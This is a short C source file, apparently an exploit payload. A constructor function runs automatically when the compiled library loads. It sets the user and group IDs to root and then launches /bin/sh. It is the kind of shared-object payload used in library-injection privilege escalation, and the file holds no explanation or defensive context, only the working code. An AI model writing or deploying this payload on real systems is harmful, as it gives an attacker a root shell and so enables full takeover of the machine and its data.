#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void __attribute__ ((constructor)) exp(void);
static void exp(void)
{
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execve("/bin/sh", a_argv, a_envp);
}